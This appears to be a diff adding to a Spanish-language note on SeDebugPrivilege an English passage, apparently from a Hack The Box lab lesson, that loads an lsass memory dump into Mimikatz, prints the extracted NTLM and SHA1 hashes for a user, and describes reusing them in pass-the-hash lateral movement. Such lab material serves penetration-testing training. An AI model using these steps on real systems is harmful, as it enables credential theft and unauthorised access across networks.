@@ -61,3 +61,77 @@ Sysinternals - www.sysinternals.com
 
 Este procedimiento genera un volcado de memoria (`lsass.dmp`) que puede analizarse posteriormente en un entorno controlado para extraer credenciales o validar el impacto del privilegio **SeDebugPrivilege** en la seguridad del sistema.
 
+---
+
+This is successful, and we can load this in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).
+
+Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.
+
+SeDebugPrivilege
+C:\htb> mimikatz.exe
+
+.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( [benjamin@gentilkiwi.com](mailto:benjamin@gentilkiwi.com) )
+
+## \ / ##       > [https://blog.gentilkiwi.com/mimikatz](https://blog.gentilkiwi.com/mimikatz)
+
+'## v ##'       Vincent LE TOUX             ( [vincent.letoux@gmail.com](mailto:vincent.letoux@gmail.com) )
+'#####'        > [https://pingcastle.com](https://pingcastle.com) / [https://mysmartlogon.com](https://mysmartlogon.com) ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+
+Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/31/2021 3:00:57 PM
+SID               : S-1-5-90-0-4
+msv :
+tspkg :
+wdigest :
+* Username : WINLPE-SRV01$
+* Domain   : WORKGROUP
+* Password : (null)
+kerberos :
+ssp :
+credman :
+
+<SNIP>
+
+Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+msv :
+[00000003] Primary
+* Username : jordan
+* Domain   : WINLPE-SRV01
+* NTLM     : cf3a5525ee9414229e66279623ed5c58
+* SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+tspkg :
+wdigest :
+* Username : jordan
+* Domain   : WINLPE-SRV01
+* Password : (null)
+kerberos :
+* Username : jordan
+* Domain   : WINLPE-SRV01
+* Password : (null)
+ssp :
+credman :
+
+<SNIP>
+
